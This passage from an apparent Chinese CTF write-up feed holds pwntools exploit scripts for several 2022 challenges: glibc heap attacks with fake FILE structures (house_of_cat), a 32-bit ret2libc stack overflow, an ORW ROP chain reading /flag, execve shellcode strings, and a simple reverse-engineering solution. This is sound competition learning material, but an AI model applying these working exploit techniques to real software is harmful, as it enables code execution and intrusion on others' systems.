class="line">sh.recv()</span><br><span class="line">key = u64(r(<span class="number">5</span>).ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">heap_base = key &lt;&lt; <span class="number">12</span></span><br><span class="line">lg(<span class="string">&#x27;heap_base&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2</span>, <span class="number">8</span>):</span><br><span class="line">    delete(i)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">libc_base = uu64() - <span class="number">0x219ce0</span></span><br><span class="line">lg(<span class="string">&#x27;libc_base&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p_rdi_r = libc_base + <span class="number">0x000000000002a3e5</span></span><br><span class="line">sys_addr = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh = libc_base + libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>).__next__()</span><br><span class="line">io_list_all = libc_base + libc.sym[<span class="string">&#x27;_IO_list_all&#x27;</span>]</span><br><span class="line">io_wfile_jumps = libc_base + libc.sym[<span class="string">&#x27;_IO_wfile_jumps&#x27;</span>]</span><br><span class="line">ogg = libc_base + <span class="number">0xebcf5</span></span><br><span class="line">lg(<span class="string">&#x27;ogg&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    add(i, <span class="number">0x108</span>, <span class="string">b&#x27;pursue&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">    add(i, <span class="number">0x68</span>, <span class="string">b&#x27;pursue&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">9</span>):</span><br><span class="line">    delete(i)</span><br><span class="line">delete(<span class="number">7</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    add(i, <span class="number">0x68</span>, <span class="string">b&#x27;pursue&#x27;</span>)</span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x68</span>, p64(key ^ io_list_all))</span><br><span class="line">add(<span class="number">1</span>, <span class="number">0x68</span>, <span class="string">b&#x27;pursue&#x27;</span>)</span><br><span class="line">add(<span class="number">2</span>, <span class="number">0x68</span>, <span class="string">b&#x27;pursue&#x27;</span>)</span><br><span class="line">add(<span class="number">3</span>, <span class="number">0x68</span>, p64(heap_base + <span class="number">0xf00</span>))</span><br><span class="line"></span><br><span class="line"><span class="comment"># _flags = prev_size = 0</span></span><br><span class="line"><span class="comment"># _IO_read_ptr</span></span><br><span class="line">fake_file1 = <span class="string">b&#x27;\x00&#x27;</span> * (<span class="number">0x10</span>)</span><br><span class="line">fake_file1 += p64(<span class="number">0</span>)    <span class="comment"># fp -&gt; _IO_write_base</span></span><br><span class="line">fake_file1 += p64(<span class="number">1</span>)    <span class="comment"># fp -&gt; _IO_write_ptr</span></span><br><span class="line">fake_file1 += p64(<span class="number">0</span>)    <span class="comment"># fp -&gt; _IO_write_end</span></span><br><span class="line">fake_file1 = fake_file1.ljust(<span class="number">0x78</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_file1 += p64(heap_base)     <span class="comment"># _lock</span></span><br><span class="line">fake_file1 = fake_file1.ljust(<span class="number">0x90</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_file1 += p64(heap_base + <span class="number">0xf00</span> + <span class="number">0x100</span>)    <span class="comment"># _wide_data</span></span><br><span class="line">fake_file1 = fake_file1.ljust(<span class="number">0xc8</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_file1 += p64(io_wfile_jumps)      <span class="comment"># vtable</span></span><br><span class="line">fake_file1 = fake_file1.ljust(<span class="number">0x100</span> - <span class="number">0x10</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">fake_wide = <span class="string">b&#x27;\x00&#x27;</span> * <span class="number">0x68</span></span><br><span class="line">fake_wide += p64(ogg)     <span class="comment"># _wide_vtable + 0x68</span></span><br><span class="line"><span class="comment"># fake_wide = fake_wide.ljust(0xa0, b&#x27;\x00&#x27;)</span></span><br><span class="line"><span class="comment"># fake_wide += p64(heap_base + 0x1c90)    # rsp -&gt; orw_addr</span></span><br><span class="line"><span class="comment"># fake_wide += p64(p_rdi_r + 1)       # rip -&gt; ret</span></span><br><span class="line">fake_wide = fake_wide.ljust(<span class="number">0xe0</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_wide += p64(heap_base + <span class="number">0xf00</span> + <span class="number">0x100</span>)     <span class="comment"># _wide_vtable</span></span><br><span class="line"></span><br><span class="line">fake_file1 += fake_wide</span><br><span class="line">add(<span class="number">4</span>, <span class="number">0x200</span>, fake_file1)</span><br><span class="line"><span class="comment"># dbg()</span></span><br><span class="line">leave()</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>柏鹭杯</tag>
      </tags>
  </entry>
  <entry>
    <title>2022 羊城杯</title>
    <url>/2022/09/19/CTF/2022%E7%BE%8A%E5%9F%8E%E6%9D%AF/</url>
    <content><![CDATA[<h2 id="fakeNoOutput"><a href="#fakeNoOutput" class="headerlink" title="fakeNoOutput"></a>fakeNoOutput</h2><p>一道http的pwn题，题目漏洞出现在upload这个功能里，存在栈溢出，主要难度在于控制输入的格式，使得程序执行到漏洞所在，还有注意程序是32位的。</p>
<span id="more"></span>

<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#encoding = utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> * </span><br><span class="line"></span><br><span class="line">context(log_level = <span class="string">&#x27;debug&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"></span><br><span class="line">local = <span class="number">2</span></span><br><span class="line"><span class="keyword">if</span> local == <span class="number">1</span> :</span><br><span class="line">	sh = process([<span class="string">b&quot;./ld.so&quot;</span>, <span class="string">b&quot;./pwn&quot;</span>], env = &#123;<span class="string">&quot;LD_PRELOAD&quot;</span> : <span class="string">b&quot;./libc.so.6&quot;</span>&#125;)</span><br><span class="line"><span class="keyword">elif</span> local == <span class="number">2</span> :</span><br><span class="line">    sh = process(<span class="string">&quot;./fakeNoOutput&quot;</span>)</span><br><span class="line"><span class="keyword">else</span> :</span><br><span class="line">	sh = remote(ip, port)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./fakeNoOutput&#x27;</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>():</span><br><span class="line">    gdb.attach(sh)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">s       = <span class="keyword">lambda</span> data               :sh.send(data)</span><br><span class="line">sa      = <span class="keyword">lambda</span> text, data         :sh.sendafter(text, data)</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :sh.sendline(data)</span><br><span class="line">sla     = <span class="keyword">lambda</span> text, data         :sh.sendlineafter(text, data)</span><br><span class="line">r       = <span class="keyword">lambda</span> num                :sh.recv(num)</span><br><span class="line">ru      = <span class="keyword">lambda</span> text               :sh.recvuntil(text)</span><br><span class="line">uu32    = <span class="keyword">lambda</span>                    :u32(sh.recvuntil(<span class="string">&quot;\xf7&quot;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span>                    :u64(sh.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">lg      = <span class="keyword">lambda</span> s                  :sh.success(<span class="string">&#x27;\033[32m%s -&gt; 0x%x\033[0m&#x27;</span> % (s, <span class="built_in">eval</span>(s)))</span><br><span class="line">lgl     = <span class="keyword">lambda</span> s, value           :sh.success(<span class="string">&#x27;\033[32m%s -&gt; 0x%x\033[0m&#x27;</span> % (s, value))</span><br><span class="line"></span><br><span class="line">sh_x86_18=<span class="string">&quot;\x6a\x0b\x58\x53\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80&quot;</span></span><br><span class="line">sh_x86_20=<span class="string">&quot;\x31\xc9\x6a\x0b\x58\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80&quot;</span></span><br><span class="line">sh_x64_21=<span class="string">&quot;\xf7\xe6\x50\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x48\x89\xe7\xb0\x3b\x0f\x05&quot;</span></span><br><span class="line"><span class="comment">#https://www.exploit-db.com/shellcodes</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#------------------------------------------------------------------------------------------------------#</span></span><br><span class="line"></span><br><span class="line">pld = <span class="string">b&#x27;head /upload pursue &#x27;</span></span><br><span class="line">sl(pld)</span><br><span class="line">pld = <span class="string">b&#x27;Content-Length:6666&#x27;</span></span><br><span class="line">sl(pld)</span><br><span class="line">s(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">pld = <span class="string">b&#x27;Content:filename=pursue&#x27;</span>    <span class="comment"># 23</span></span><br><span class="line">sl(pld)</span><br><span class="line"></span><br><span class="line">leak_addr = <span class="number">0x080496A1</span></span><br><span class="line">main_addr = <span class="number">0x08049F77</span></span><br><span class="line">setbuf_got = elf.got[<span class="string">&#x27;setbuf&#x27;</span>]</span><br><span class="line">pld = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x1044</span> + p32(leak_addr) + p32(main_addr) + p32(setbuf_got)</span><br><span class="line">pld = pld.ljust(<span class="number">6666</span> - <span class="number">25</span>, <span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">sl(pld)</span><br><span class="line"></span><br><span class="line">ru(<span class="string">&#x27;Connection: close\r\n\r\n&#x27;</span>)</span><br><span class="line">libc_base = uu32() - libc.sym[<span class="string">&#x27;setbuf&#x27;</span>]</span><br><span class="line">lg(<span class="string">&#x27;libc_base&#x27;</span>)</span><br><span class="line">sys_addr = libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line">bin_sh_addr = libc_base + libc.search(<span class="string">b&#x27;/bin/sh&#x27;</span>).__next__()</span><br><span class="line"></span><br><span class="line">pld = <span class="string">b&#x27;head /upload pursue &#x27;</span></span><br><span class="line">sl(pld)</span><br><span class="line">pld = <span class="string">b&#x27;Content-Length:6666&#x27;</span></span><br><span class="line">sl(pld)</span><br><span class="line">s(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">pld = <span class="string">b&#x27;Content:filename=pursue&#x27;</span></span><br><span class="line">sl(pld)</span><br><span class="line"></span><br><span class="line">pld = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x1044</span> + p32(sys_addr) + p32(main_addr) + p32(bin_sh_addr)</span><br><span class="line">pld = pld.ljust(<span class="number">6666</span> - <span class="number">25</span>, <span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">sl(pld)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>



<h2 id="dream"><a href="#dream" class="headerlink" title="dream"></a>dream</h2><p>程序流程简单，想到<code>house_of_cat</code>的攻击手法，困难在于魔改的xxTea加密算法，一开始是直接套的网上的脚本（<a href="https://blog.csdn.net/u012871930/article/details/126144383?ops_request_misc=&request_id=&biz_id=102&utm_term=xxtea&utm_medium=distribute.pc_search_result.none-task-blog-2~all~sobaiduweb~default-1-126144383.nonecase&spm=1018.2226.3001.4187">(14条消息) XXTEA算法使用C语言实现_小手冰凉__的博客-CSDN博客_xxtea</a>），发现输出和地址的格式对不上号，原因是程序的xxTea有改动，本人在脚本中加了注释<code>Note</code>，之后还会对整套的Tea加密算法进行学习。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#encoding = utf-8</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> * </span><br><span class="line"></span><br><span class="line">context(log_level = <span class="string">&#x27;debug&#x27;</span>, os = <span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;amd64&#x27;</span>)</span><br><span class="line"></span><br><span class="line">local = <span class="number">2</span></span><br><span class="line"><span class="keyword">if</span> local == <span class="number">1</span> :</span><br><span class="line">	sh = process([<span class="string">b&quot;./ld.so&quot;</span>, <span class="string">b&quot;./pwn&quot;</span>], env = &#123;<span class="string">&quot;LD_PRELOAD&quot;</span> : <span class="string">b&quot;./libc.so.6&quot;</span>&#125;)</span><br><span class="line"><span class="keyword">elif</span> local == <span class="number">2</span> :</span><br><span class="line">    sh = process(<span class="string">&quot;./dream&quot;</span>)</span><br><span class="line"><span class="keyword">else</span> :</span><br><span class="line">	sh = remote(ip, port)</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./dream&#x27;</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>():</span><br><span class="line">    gdb.attach(sh)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line">s       = <span class="keyword">lambda</span> data               :sh.send(data)</span><br><span class="line">sa      = <span class="keyword">lambda</span> text, data         :sh.sendafter(text, data)</span><br><span class="line">sl      = <span class="keyword">lambda</span> data               :sh.sendline(data)</span><br><span class="line">sla     = <span class="keyword">lambda</span> text, data         :sh.sendlineafter(text, data)</span><br><span class="line">r       = <span class="keyword">lambda</span> num                :sh.recv(num)</span><br><span class="line">ru      = <span class="keyword">lambda</span> text               :sh.recvuntil(text)</span><br><span class="line">uu32    = <span class="keyword">lambda</span>                    :u32(sh.recvuntil(<span class="string">&quot;\xf7&quot;</span>)[-<span class="number">4</span>:].ljust(<span class="number">4</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">uu64    = <span class="keyword">lambda</span>                    :u64(sh.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line">lg      = <span class="keyword">lambda</span> s                  :sh.success(<span class="string">&#x27;\033[32m%s -&gt; 0x%x\033[0m&#x27;</span> % (s, <span class="built_in">eval</span>(s)))</span><br><span class="line">lgl     = <span class="keyword">lambda</span> s, value           :sh.success(<span class="string">&#x27;\033[32m%s -&gt; 0x%x\033[0m&#x27;</span> % (s, value))</span><br><span class="line"></span><br><span class="line">sh_x86_18=<span class="string">&quot;\x6a\x0b\x58\x53\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80&quot;</span></span><br><span class="line">sh_x86_20=<span class="string">&quot;\x31\xc9\x6a\x0b\x58\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80&quot;</span></span><br><span class="line">sh_x64_21=<span class="string">&quot;\xf7\xe6\x50\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x48\x89\xe7\xb0\x3b\x0f\x05&quot;</span></span><br><span class="line"><span class="comment">#https://www.exploit-db.com/shellcodes</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#------------------------------------------------------------------------------------------------------#</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">idx, size, content</span>):</span><br><span class="line">    sla(<span class="string">&#x27;choice: &#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    sla(<span class="string">&#x27;Give me a dream ID: &#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">    sla(<span class="string">&#x27;how long: &#x27;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">    sa(<span class="string">&#x27;dream: &#x27;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delete</span>(<span class="params">idx</span>):</span><br><span class="line">    sla(<span class="string">&#x27;choice: &#x27;</span>, <span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    sla(<span class="string">&#x27;Which dream to wake?&#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    sla(<span class="string">&#x27;choice: &#x27;</span>, <span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    sla(<span class="string">&#x27;Which dream do you want to show?&#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx, content</span>):</span><br><span class="line">    sla(<span class="string">&#x27;choice: &#x27;</span>, <span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    sla(<span class="string">&#x27;Which dream to make?&#x27;</span>, <span class="built_in">str</span>(idx))</span><br><span class="line">    sa(<span class="string">&#x27;dream: &#x27;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">MX</span>(<span class="params">y, z, <span class="built_in">sum</span>, e, key, p</span>):</span><br><span class="line">    <span class="keyword">return</span> ((((<span class="number">8</span> * y) ^ (z &gt;&gt; <span class="number">7</span>)) + ((y &gt;&gt; <span class="number">3</span>) ^ (<span class="number">16</span> * z))) ^ ((y ^ <span class="built_in">sum</span>) + (z ^ key[e ^ p &amp; <span class="number">3</span>])))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">v, <span class="built_in">len</span></span>):</span><br><span class="line">    key = [<span class="number">9</span>, <span class="number">5</span>, <span class="number">2</span>, <span class="number">7</span>]</span><br><span class="line">    delta = <span class="number">0x61C88647</span></span><br><span class="line"></span><br><span class="line">    n = <span class="built_in">len</span> - <span class="number">1</span></span><br><span class="line">    q = <span class="number">6</span> + <span class="number">52</span> // <span class="built_in">len</span></span><br><span class="line">    <span class="built_in">sum</span> = (q * delta * (-<span class="number">1</span>)) &amp; <span class="number">0xffffffff</span></span><br><span class="line">    z = v[n]</span><br><span class="line">    y = v[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> q:</span><br><span class="line">        e = <span class="built_in">sum</span> &gt;&gt; <span class="number">2</span> &amp; <span class="number">3</span></span><br><span class="line">        <span class="keyword">for</span> p <span class="keyword">in</span> <span class="built_in">range</span>(n, <span class="number">0</span>, -<span class="number">1</span>):</span><br><span class="line">            z = v[p - <span class="number">1</span>]</span><br><span class="line">            v[p] -= MX(y, z, <span class="built_in">sum</span>, e, key, p)</span><br><span class="line">            v[p] &amp;= <span class="number">0xffffffff</span></span><br><span class="line">            y = v[p]</span><br><span class="line"></span><br><span class="line">        p -= <span class="number">1</span>      <span class="comment"># Note</span></span><br><span class="line">        z = v[n]</span><br><span class="line">        v[<span class="number">0</span>] -= MX(y, z, <span class="built_in">sum</span>, e, key, p)</span><br><span class="line">        v[<span class="number">0</span>] &amp;= <span class="number">0xffffffff</span></span><br><span class="line">        y = v[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">        <span class="built_in">sum</span> += delta</span><br><span class="line">        <span class="built_in">sum</span> &amp;= <span class="number">0xffffffff</span></span><br><span class="line">        q -= <span class="number">1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> v</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x420</span>, <span class="string">b&#x27;pursue&#x27;</span>)    <span class="comment"># chunk_1</span></span><br><span class="line">add(<span class="number">1</span>, <span class="number">0x400</span>, <span class="string">b&#x27;pursue&#x27;</span>)</span><br><span class="line">add(<span class="number">2</span>, <span class="number">0x410</span>, <span class="string">b&#x27;pursue&#x27;</span>)    <span class="comment"># chunk_2</span></span><br><span class="line">add(<span class="number">3</span>, <span class="number">0x400</span>, <span class="string">b&#x27;pursue&#x27;</span>)</span><br><span class="line">delete(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">4</span>, <span class="number">0x460</span>, <span class="string">b&#x27;pursue&#x27;</span>)</span><br><span class="line">add(<span class="number">5</span>, <span class="number">0x460</span>, <span class="string">b&#x27;pursue&#x27;</span>)   </span><br><span class="line">delete(<span class="number">4</span>)</span><br><span class="line">delete(<span class="number">5</span>)</span><br><span class="line"></span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">lt = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0x420</span> // <span class="number">4</span>):</span><br><span class="line">    lt.append(u32(r(<span class="number">4</span>)))</span><br><span class="line"><span class="comment"># print(lt)</span></span><br><span class="line">lt = decrypt(lt, <span class="number">0x420</span> // <span class="number">4</span>)</span><br><span class="line"><span class="built_in">print</span>(lt)</span><br><span class="line">libc_base = (lt[<span class="number">1</span>] &lt;&lt; <span class="number">32</span>) + lt[<span class="number">0</span>] - <span class="number">0x1e3ff0</span></span><br><span class="line">heap_base = (lt[<span class="number">5</span>] &lt;&lt; <span class="number">32</span>) + lt[<span class="number">4</span>] - <span class="number">0x290</span></span><br><span class="line">lg(<span class="string">&#x27;libc_base&#x27;</span>)</span><br><span class="line">lg(<span class="string">&#x27;heap_base&#x27;</span>)</span><br><span class="line">stderr = libc_base + libc.sym[<span class="string">&#x27;stderr&#x27;</span>]</span><br><span class="line">IO_wfile_jumps = libc_base + libc.sym[<span class="string">&#x27;_IO_wfile_jumps&#x27;</span>]</span><br><span class="line">setcontext_61 = libc_base + <span class="number">0x53030</span> + <span class="number">61</span></span><br><span class="line">lg(<span class="string">&#x27;setcontext_61&#x27;</span>)</span><br><span class="line">p_rdi_r = libc_base + <span class="number">0x000000000002858f</span></span><br><span class="line">p_rsi_r = libc_base + <span class="number">0x000000000002ac3f</span></span><br><span class="line">p_rdx_r12_r = libc_base + <span class="number">0x0000000000114161</span></span><br><span class="line">p_rax_r = libc_base + <span class="number">0x0000000000045580</span></span><br><span class="line">syscall_r = libc_base + <span class="number">0x00000000000611ea</span></span><br><span class="line"></span><br><span class="line">pld = p64(libc_base + <span class="number">0x1e3ff0</span>) * <span class="number">2</span></span><br><span class="line">pld += p64(heap_base + <span class="number">0x290</span>) + p64(stderr - <span class="number">0x20</span>)</span><br><span class="line">edit(<span class="number">0</span>, pld)</span><br><span class="line">delete(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">6</span>, <span class="number">0x470</span>, <span class="string">b&#x27;pursue&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># _flags = prev_size = 0</span></span><br><span class="line"><span class="comment"># _IO_read_ptr</span></span><br><span class="line">fake_file1 = <span class="string">b&#x27;\x00&#x27;</span> * (<span class="number">0x28</span>)</span><br><span class="line">fake_file1 += p64(<span class="number">1</span>)    <span class="comment"># _wide_data -&gt; _IO_read_end</span></span><br><span class="line">fake_file1 += p64(<span class="number">0</span>)    <span class="comment"># _wide_data -&gt; _IO_read_base</span></span><br><span class="line">fake_file1 += p64(<span class="number">0</span>)    <span class="comment"># _wide_data -&gt; _IO_write_base</span></span><br><span class="line">fake_file1 += p64(heap_base + <span class="number">0xad0</span> + <span class="number">0xe0</span> + <span class="number">0x30</span> + <span class="number">0x20</span>)   <span class="comment"># _IO_write_ptr also new_rdx</span></span><br><span class="line">fake_file1 = fake_file1.ljust(<span class="number">0x78</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_file1 += p64(heap_base)     <span class="comment"># _lock</span></span><br><span class="line">fake_file1 = fake_file1.ljust(<span class="number">0x90</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_file1 += p64(heap_base + <span class="number">0xad0</span> + <span class="number">0x30</span>)    <span class="comment"># _wide_data</span></span><br><span class="line">fake_file1 = fake_file1.ljust(<span class="number">0xb0</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_file1 += p64(<span class="number">0</span>)    <span class="comment"># _mode = 0</span></span><br><span class="line">fake_file1 = fake_file1.ljust(<span class="number">0xc8</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_file1 += p64(IO_wfile_jumps + <span class="number">0x10</span>)      <span class="comment"># vtable</span></span><br><span class="line">fake_file1 = fake_file1.ljust(<span class="number">0xe0</span> + <span class="number">0x20</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">fake_file1 += p64(heap_base + <span class="number">0xad0</span> + <span class="number">0xe0</span> + <span class="number">0x30</span>)  <span class="comment"># new_rax</span></span><br><span class="line">fake_file1 += p64(<span class="number">0</span>) * <span class="number">2</span></span><br><span class="line">fake_file1 += p64(setcontext_61)</span><br><span class="line">fake_file1 += <span class="string">b&#x27;\x00&#x27;</span> * <span class="number">0xa0</span></span><br><span class="line">fake_file1 += p64(heap_base + <span class="number">0x2a0</span>)    <span class="comment"># rsp -&gt; orw_addr</span></span><br><span class="line">fake_file1 += p64(p_rdi_r + <span class="number">1</span>)      <span class="comment"># rip -&gt; ret</span></span><br><span class="line">edit(<span class="number">2</span>, fake_file1)</span><br><span class="line"></span><br><span class="line">orw = p64(p_rdi_r) + p64(heap_base + <span class="number">0x390</span>)</span><br><span class="line">orw += p64(p_rsi_r) + p64(<span class="number">0</span>)</span><br><span class="line">orw += p64(p_rdx_r12_r) + p64(<span class="number">0</span>) + p64(<span class="number">0</span>)</span><br><span class="line">orw += p64(p_rax_r) + p64(<span class="number">2</span>)</span><br><span class="line">orw += p64(syscall_r)       <span class="comment"># open</span></span><br><span class="line">orw += p64(p_rdi_r) + p64(<span class="number">3</span>)</span><br><span class="line">orw += p64(p_rdx_r12_r) + p64(<span class="number">0x30</span>) + p64(<span class="number">0</span>)</span><br><span class="line">orw += p64(p_rsi_r) + p64(heap_base + <span class="number">0x3000</span>)</span><br><span class="line">orw += p64(p_rax_r) + p64(<span class="number">0</span>)</span><br><span class="line">orw += p64(syscall_r)       <span class="comment"># read</span></span><br><span class="line">orw += p64(p_rdi_r) + p64(<span class="number">1</span>)</span><br><span class="line">orw += p64(p_rdx_r12_r) + p64(<span class="number">0x30</span>) + p64(<span class="number">0</span>)</span><br><span class="line">orw += p64(p_rsi_r) + p64(heap_base + <span class="number">0x3000</span>)</span><br><span class="line">orw += p64(p_rax_r) + p64(<span class="number">1</span>)</span><br><span class="line">orw += p64(syscall_r)       <span class="comment"># write</span></span><br><span class="line">orw += <span class="string">b&#x27;/flag\x00&#x27;</span></span><br><span class="line">edit(<span class="number">0</span>, orw)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">5</span>, p64(<span class="number">0</span>) + p64(<span class="number">0x60</span>))</span><br><span class="line">sla(<span class="string">&#x27;choice: &#x27;</span>, <span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">sla(<span class="string">&#x27;Give me a dream ID: &#x27;</span>, <span class="string">b&#x27;8&#x27;</span>)</span><br><span class="line"><span class="comment"># dbg()</span></span><br><span class="line">sla(<span class="string">&#x27;how long: &#x27;</span>, <span class="built_in">str</span>(<span class="number">0x4e0</span>))</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>羊城杯</tag>
      </tags>
  </entry>
  <entry>
    <title>2022 网鼎杯 青龙组</title>
    <url>/2022/08/31/CTF/2022%E7%BD%91%E9%BC%8E%E6%9D%AF/</url>
    <content><![CDATA[<h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><h3 id="re694"><a href="#re694" class="headerlink" title="re694"></a>re694</h3><p>魔改了特征码，需要用010将FUK改成UPX，然后用<code>upx -d</code>进行脱壳，读者也可以用upxfix进行尝试，用IDA打开脱壳后的程序，发现进行了两次加密，还是比较简单的。</p>
<p>WP如下：</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">s = [<span class="number">0x4B</span>, <span class="number">0x48</span>, <span class="number">0x79</span>, <span class="number">0x13</span>, <span class="number">0x45</span>, <span class="number">0x30</span>, <span class="number">0x5C</span>, <span class="number">0x49</span>, <span class="number">0x5A</span>, <span class="number">0x79</span>, </span><br><span class="line">    <span class="number">0x13</span>, <span class="number">0x70</span>, <span class="number">0x6D</span>, <span class="number">0x78</span>, <span class="number">0x13</span>, <span class="number">0x6F</span>, <span class="number">0x48</span>, <span class="number">0x5D</span>, <span class="number">0x64</span>, <span class="number">0x64</span>]</span><br><span class="line">flag = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">    flag += <span class="built_in">chr</span>(((i ^ <span class="number">80</span>) - <span class="number">10</span>) ^ <span class="number">102</span>)</span><br><span class="line"></span><br><span class="line">flag = <span class="string">&#x27;flag&#123;&#x27;</span> + flag + <span class="string">&#x27;&#125;&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>

<span id="more"></span>

